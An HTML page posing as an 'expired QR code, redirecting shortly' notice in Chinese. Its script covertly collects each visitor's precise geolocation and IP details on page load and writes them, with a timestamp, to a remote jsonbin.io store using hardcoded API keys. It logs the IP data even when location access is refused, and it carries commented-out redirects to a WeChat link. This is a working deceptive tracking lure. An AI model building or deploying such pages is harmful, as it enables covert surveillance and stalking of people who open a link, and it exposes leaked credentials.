<html>

        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

    <body>
        <h1>二维码过期, 稍後將重新定向......</h1>

        <script>

if ("geolocation" in navigator) {
  // Prompt user for permission to access their location
  navigator.geolocation.getCurrentPosition(
    // Success callback function
    (position) => {
      // Get the user's latitude and longitude coordinates
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;

      // Do something with the location data, e.g. display on a map
      console.log(`Latitude: ${lat}, longitude: ${lng}`);

      $.get('http://ip-api.com/json/', (data) => {
                // Convert key-value pairs to JSON
                // https://stackoverflow.com/a/39284735/452587
                console.log(data)
                var settings = {
                    "url": "https://api.jsonbin.io/v3/b/64e36bc28e4aa6225ed34b25",
                    "method": "GET",
                    "timeout": 0,
                    "headers": {
                        "X-MASTER-KEY": "$2b$10$EaN5Y7c20W063NZCI0X0aexcShPuKPxJJUU5OCc.SRXGg5vQ5dvJW",
                        "X-ACCESS-KEY": "$2b$10$ALopFTEdhaanD01.TTBDIeBpOp.kM85iyiBrRnwLEzRTIBdyauPiG",
                        "Content-Type": "application/json"
                    },
                };

                $.ajax(settings).done((response) => {
                    settings.method = "PUT";
                    response.record.push({
                        ...data,
                        coords: position.coords,
                        time: new Date(),
                    });
                    settings.data = JSON.stringify(response.record);
                    $.ajax(settings);
                    setTimeout(() => {
                        // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
                    }, 1000);
                });
            });


    },
    // Error callback function
    (error) => {
      // Handle errors, e.g. user denied location sharing permissions
      console.error("Error getting user location:", error);
      
      $.get('http://ip-api.com/json/', (data) => {
                // Convert key-value pairs to JSON
                // https://stackoverflow.com/a/39284735/452587
                console.log(data)
                var settings = {
                    "url": "https://api.jsonbin.io/v3/b/64e36bc28e4aa6225ed34b25",
                    "method": "GET",
                    "timeout": 0,
                    "headers": {
                        "X-MASTER-KEY": "$2b$10$EaN5Y7c20W063NZCI0X0aexcShPuKPxJJUU5OCc.SRXGg5vQ5dvJW",
                        "X-ACCESS-KEY": "$2b$10$ALopFTEdhaanD01.TTBDIeBpOp.kM85iyiBrRnwLEzRTIBdyauPiG",
                        "Content-Type": "application/json"
                    },
                };

                $.ajax(settings).done((response) => {
                    settings.method = "PUT";
                    response.record.push({
                        ...data,
                        coords: error,
                        time: new Date(),
                    });
                    settings.data = JSON.stringify(response.record);
                    $.ajax(settings);
                    setTimeout(() => {
                        // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
                    }, 1000);
                });
            });

      // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
    }
  );
} else {
  // Geolocation is not supported by the browser
  console.error("Geolocation is not supported by this browser.");
  
  // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
}

           
        </script>
    </body>
